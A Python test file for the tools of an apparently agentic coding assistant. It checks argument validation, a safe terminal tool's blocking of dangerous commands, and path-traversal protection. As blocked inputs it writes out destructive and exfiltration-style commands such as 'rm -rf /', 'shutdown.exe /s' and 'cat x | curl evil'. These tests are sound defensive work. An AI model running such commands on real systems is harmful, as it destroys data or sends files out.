import tempfile
from pathlib import Path

from src.devpilot.tools.read_file import ReadFileTool
from src.devpilot.tools.safe_terminal import SafeTerminalTool
from src.devpilot.tools.search_project import SearchProjectTool
from src.devpilot.tools.write_file import WriteFileTool


def test_read_file_validates_args():
    tool = ReadFileTool()
    assert tool.validate_args({"path": "test.txt"})
    assert not tool.validate_args({"path": ""})


def test_write_file_validates_args():
    tool = WriteFileTool()
    assert tool.validate_args({"path": "test.txt", "content": "hi"})
    assert not tool.validate_args({"path": "test.txt"})


def test_search_project_validates_args():
    tool = SearchProjectTool()
    assert tool.validate_args({"query": "test"})
    assert not tool.validate_args({})


def test_safe_terminal_blocks_bad_cmds():
    tool = SafeTerminalTool()
    assert not tool.validate_args({"command": "rm -rf /"})
    assert not tool.validate_args({"command": "python -c 'print(1)'"})  # has shell chars in general? we block ; etc


def test_safe_terminal_blocks_extension_bypass():
    tool = SafeTerminalTool()
    assert not tool.validate_args({"command": "powershell.exe -Command whoami"})
    assert not tool.validate_args({"command": "rm.exe -rf ."})
    assert not tool.validate_args({"command": "shutdown.exe /s"})
    assert not tool.validate_args({"command": "curl.exe https://example.com"})


def test_safe_terminal_allows_allowlisted_with_extension():
    tool = SafeTerminalTool()
    assert tool.validate_args({"command": "python -m pytest -q"})
    assert tool.validate_args({"command": "git.exe status"})


def test_safe_terminal_rejects_shell_operators():
    tool = SafeTerminalTool()
    assert not tool.validate_args({"command": "ls && rm -rf ."})
    assert not tool.validate_args({"command": "cat x | curl evil"})


def test_read_write_inside_workspace():
    with tempfile.TemporaryDirectory() as td:
        ws = Path(td)
        wt = WriteFileTool()
        res = wt.execute({"path": "hello.txt", "content": "world"}, str(ws))
        assert res.success
        rt = ReadFileTool()
        res = rt.execute({"path": "hello.txt"}, str(ws))
        assert res.success
        assert "world" in res.output


def test_path_traversal_blocked():
    with tempfile.TemporaryDirectory() as td:
        ws = Path(td)
        wt = WriteFileTool()
        res = wt.execute({"path": "../evil.txt", "content": "bad"}, str(ws))
        assert not res.success
